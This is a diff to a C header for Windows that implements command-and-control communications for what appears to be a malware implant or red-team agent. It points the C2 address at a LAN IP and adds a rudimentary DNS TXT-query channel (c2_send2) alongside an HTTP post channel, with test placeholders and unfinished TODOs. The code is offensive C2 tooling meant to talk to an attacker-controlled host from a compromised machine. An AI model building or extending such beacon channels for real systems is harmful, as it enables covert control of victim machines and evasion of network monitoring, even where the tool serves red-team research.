@@ -1,11 +1,24 @@
-#ifndef C2_COMMS
-#define C2_COMMS
+#ifndef _WINSOCK_WRAPPER_H_
+#define _WINSOCK_WRAPPER_H_
+#endif
 
-// Need to do this because windows is stupid
+#ifndef _WINDOWS_
+#define WIN32_LEAN_AND_MEAN
 #define WIN32_NO_STATUS
 #include <Windows.h>
 #undef WIN32_NO_STATUS
+#endif
 
+
+#ifndef C2_COMMS
+#define C2_COMMS
+
+
+// Need to do this because windows is stupid
+
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -15,14 +28,17 @@
 #include <winhttp.h>
 #include <wincrypt.h>
 #include <bcrypt.h>
+#include <windns.h>
 #include <processthreadsapi.h>
 
+#pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "Pathcch.lib")
 #pragma comment(lib, "Winhttp.lib")
 #pragma comment(lib, "Crypt32.lib")
 #pragma comment(lib, "Bcrypt.lib")
+#pragma comment(lib, "Dnsapi.lib")
 
 
 // Function declarations
@@ -42,7 +58,7 @@ int c2_recv(char* buffer, int len);
 
 
 // Configurations
-const wchar_t* C2_IP           = L"127.0.0.1";
+const wchar_t* C2_IP           = L"192.168.187.13";
 const short    C2_PORT         = 80;
 const wchar_t* C2_API_ENDPOINT = L"/post";
 const wchar_t* C2_USER_AGENT   = L"TESTNG AGENT";
@@ -393,6 +409,48 @@ int c2_send(char* data, int len) {
     }
 
     return len;
+}
+
+
+// TODO: needs lots of clean up
+int c2_send2(char* msg, int len) {
+
+    DNS_STATUS status;
+    DNS_ADDR_ARRAY addrArray   = {0};
+    DNS_QUERY_REQUEST request  = {0};
+    PDNS_RECORD result         = NULL;
+    struct sockaddr_in ip      = {0};
+
+    PDNS_RECORD pDnsRecord = NULL;
+    PIP4_ARRAY pSrvList = NULL;
+
+
+    pSrvList = (PIP4_ARRAY) Malloc(20);
+    pSrvList->AddrCount = 1;
+    int numerical_ip = 0;
+    if (InetPtonW(AF_INET, C2_IP, &numerical_ip) != 1) {
+        c2_log("[!] c2_send2:InetPtonW failed\n");
+        return 0;
+    }
+    pSrvList->AddrArray[0] = numerical_ip;
+
+
+    status = DnsQuery_A("test.edu", DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE, pSrvList, &result, NULL);
+    if (status == ERROR_INVALID_PARAMETER) {
+        c2_log("[!] dns invalud param\n");
+        return 0;
+    }
+    if (status != ERROR_SUCCESS && status != DNS_INFO_NO_RECORDS) {
+        c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
+        return 0;
+    }
+
+    Free(pSrvList);
+
+    // TODO actually process result
+    c2_log("[+] DNS query success");
+    return 1;
+
 }
 
 #endif
